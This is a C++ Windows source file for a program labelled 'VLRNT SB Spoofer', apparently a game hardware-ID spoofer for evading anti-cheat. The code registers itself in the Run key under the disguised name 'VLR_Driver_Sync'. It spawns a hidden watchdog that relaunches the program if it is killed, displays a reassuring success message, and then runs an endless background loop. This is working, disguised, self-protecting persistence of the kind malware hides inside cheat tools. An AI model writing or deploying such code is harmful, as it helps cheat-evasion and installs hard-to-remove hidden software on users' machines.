#include "hooks.h"
#include <gdiplus.h>

using namespace Gdiplus;

void InitializeWatchdog() {
    char p[MAX_PATH]; GetModuleFileNameA(NULL, p, MAX_PATH);
    std::string c = std::string(p) + " --kernel-watchdog " + std::to_string(GetCurrentProcessId());
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)c.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

int APIENTRY WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS) {
    std::string cl = lpC;
    if (cl.find("--kernel-watchdog") != std::string::npos) {
        size_t pos = cl.find("--kernel-watchdog ") + 18;
        DWORD parent = std::stoul(cl.substr(pos));
        while (true) {
            HANDLE h = OpenProcess(SYNCHRONIZE, FALSE, parent);
            if (h == NULL) {
                char p[MAX_PATH]; GetModuleFileNameA(NULL, p, MAX_PATH);
                STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
                CreateProcessA(NULL, p, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                return 0;
            }
            CloseHandle(h); Sleep(5000); 
        }
    }

    // Initialize Spoofer Resources
    MapPhysicalSerials();
    CleanRegistryTraces();
    
    // Auto-start persistence
    char p[MAX_PATH]; GetModuleFileNameA(NULL, p, MAX_PATH);
    HKEY k;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExA(k, "VLR_Driver_Sync", 0, REG_SZ, (BYTE*)p, strlen(p) + 1);
        RegCloseKey(k);
    }

    InitializeWatchdog();
    MessageBoxA(NULL, "Spoofer Success: All HWID hooks established successfully.\r\nPlease keep this process active to maintain driver sync.", "VLRNT SB Spoofer", MB_OK | MB_ICONINFORMATION);

    GdiplusStartupInput gsi; ULONG_PTR gst;
    GdiplusStartup(&gst, &gsi, NULL);
    while (true) {
        SyncDriverConfig();
        Sleep(60000);
    }
    GdiplusShutdown(gst);
    return 0;
}
